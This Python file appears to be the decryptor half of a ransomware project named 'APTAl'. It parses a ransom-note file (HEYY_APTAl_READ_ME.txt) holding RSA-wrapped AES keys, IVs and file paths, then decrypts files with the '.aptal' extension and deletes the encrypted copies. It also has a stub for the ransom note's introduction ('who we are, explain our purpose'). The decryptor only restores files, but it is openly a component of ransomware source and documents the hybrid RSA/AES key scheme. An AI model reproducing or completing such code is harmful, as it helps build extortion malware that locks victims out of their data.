import os
import sys
import base64

import Utils
sys.path.append(os.path.abspath('../hasp'))
from AESCipher import AESCipher
from RSACipher import RSACipher


def aboutAPTAl():
    print(""" who we are, explain our purpose and give an advice""")

def openthelock():
    """
        IVs, AES key and file paths are encrypted by RSA public key after file encrypted by AES.
        This function decrypt the encrypted information.

        HEYY_APTAl_READ_ME.txt schema
            info about us
            base64(RSA(aes key))
            base64(RSA(iv_1)):::::base64(RSA(file_1))
            .
            .
            .
            base64(RSA(iv_n)):::::base64(RSA(file_n))

    """
    print("Begin to DECRYPT the keys")

    rsa_private_key = open(Utils.rsa_private_key_path,"rb").read()
    rsa_cipher = RSACipher(rsa_private_key)

    # passing the introduction section
    pass_the_introduction = 1 #Utils.who_we_are
    pass_the_introduction += len(Utils.what_is_my_purpose.split("\n"))-2
    
    with open(Utils.enc_aesIV_file_store_path,"rb") as ivs_file:
        
        for i in range(pass_the_introduction):
            _temp = ivs_file.readline()

        with open(Utils.dec_aesIV_file_store_path,"wb") as dec_ivs_file:

            # decrypt aes key
            aes_key = ivs_file.readline().strip()
            aes_key = base64.b64decode(aes_key)
            aes_key = rsa_cipher.decrypt(aes_key)
            dec_ivs_file.write(aes_key+b"\n")
            
            # Decrypt iv and path with given RSA private key than write the decrypted pairs to Utils.dec_aesIV_file_store_path
            for line in ivs_file.readlines():
                iv, which_file = line.strip().split(b":::::")       
                iv = rsa_cipher.decrypt(base64.b64decode(iv.decode()))
                which_file = rsa_cipher.decrypt(base64.b64decode(which_file.decode("utf-8")))
                dec_ivs_file.write(iv+b":::::"+which_file+b"\n")

def decryptFile(aes_cipher,iv,file_path):
    """
        Decryption of files which are encrypted with AES is done here

        aes_cipher: our AES decryptor object
        iv: the initial vector(iv) which is used to encrypt the file
        file_path: which file will decrypt
    """
    encrypted_file_path = file_path+b".aptal"
    chunk_size = 16*1024
    with open(encrypted_file_path, 'rb') as infile:
        with open(file_path, 'wb') as outfile:
            while True:
                chunk = infile.read(chunk_size)
                if len(chunk) == 0:
                    break
                outfile.write(aes_cipher.decrypt(iv, chunk))
    # deleting .aptal file
    os.remove(encrypted_file_path) 

def startRescueFiles():
    """
        Reading IVs and file paths from decrypted_iv_file.txt which is a form of decrypted HEYY_APTAl_READ_ME.txt file
    """
    print("Begin to DECRYPT the Files")

    with open(Utils.dec_aesIV_file_store_path,"rb") as ivs_file:

        # read aes key
        aes_key = ivs_file.readline().strip()
        aes_cipher = AESCipher(aes_key)

        # read the file line by line then decrypt them one by one
        for line in ivs_file.readlines():
            iv, which_file = line.strip().split(b":::::")
            decryptFile(aes_cipher,iv,which_file)


def main():
    
    aboutAPTAl()
    openthelock()
    startRescueFiles()


if __name__ == "__main__":
    main()